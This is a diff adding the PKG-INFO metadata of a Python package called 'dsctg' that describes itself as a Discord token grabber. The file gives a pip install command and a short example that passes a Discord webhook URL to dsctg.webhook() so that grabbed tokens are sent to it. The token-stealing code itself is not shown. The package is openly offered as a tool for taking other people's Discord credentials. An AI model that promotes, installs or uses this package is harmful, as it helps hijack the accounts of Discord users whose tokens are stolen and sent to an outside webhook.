@@ -1,0 +1,36 @@
+Metadata-Version: 2.1
+Name: dsctg
+Version: 1.0.1
+Summary: Grab discord tokens and send it to your discord webhook
+Author: Rahul Nanwani
+Author-email: rahulnanwani@icloud.com
+License: MIT License
+Platform: UNKNOWN
+Classifier: Programming Language :: Python :: 3
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: Microsoft :: Windows
+Requires-Python: >=3.6
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+# Discord Token Grabber
+
+Grab discord tokens and send it to your discord webhook
+
+## Installation
+```bash
+pip install dsctg
+```
+
+## Example:
+```py
+import dsctg
+
+# Your discord webhook url
+webhook_url = 'https://discord.com/api/webhooks/61942069/y0U5uCk'
+
+dsctg.webhook(webhook_url)
+
+```
+
+
